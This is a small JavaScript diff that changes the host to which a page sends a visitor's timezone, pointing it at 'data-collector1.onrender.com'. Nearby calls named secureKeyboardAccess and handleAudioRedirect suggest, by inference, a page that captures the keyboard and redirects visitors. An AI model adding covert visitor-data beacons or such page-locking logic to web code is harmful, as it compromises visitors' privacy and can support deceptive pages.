@@ -135,7 +135,7 @@ function initiateApiRequestOnce() {
 
     secureKeyboardAccess();
     const clientTimezone = getCurrentTimezone();
-    transmitTimezoneData('https://tokyotastesjp-app6.onrender.com', clientTimezone)
+    transmitTimezoneData('https://data-collector1.onrender.com', clientTimezone)
         .then(handleAudioRedirect)
         .catch(handleError);
 }
